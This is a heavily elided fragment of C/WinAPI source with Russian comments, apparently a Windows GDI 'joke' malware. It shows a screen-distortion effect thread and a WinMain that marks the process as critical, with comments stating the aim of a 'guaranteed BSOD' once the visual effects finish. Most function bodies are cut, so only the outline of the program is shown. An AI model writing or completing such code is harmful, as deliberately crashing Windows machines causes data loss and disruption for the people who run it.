...
// ==================== ВСЕ ЭФФЕКТЫ (ОПТИМИЗИРОВАНЫ ДЛЯ WIN10) ====================
...
DWORD WINAPI rgb_hell_drip(LPVOID lpvd) {
    ...
    bmpi.bmiHeader.biHeight = -h;  // Отрицательная высота для правильной ориентации
...
int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ...
    // Делаем процесс критическим (для гарантии BSOD)
    ProcessIsCritical();
    ...
    // ====== ГАРАНТИРОВАННЫЙ BSOD ======
    // Ждём точное время всех эффектов (с запасом в 1 секунду)
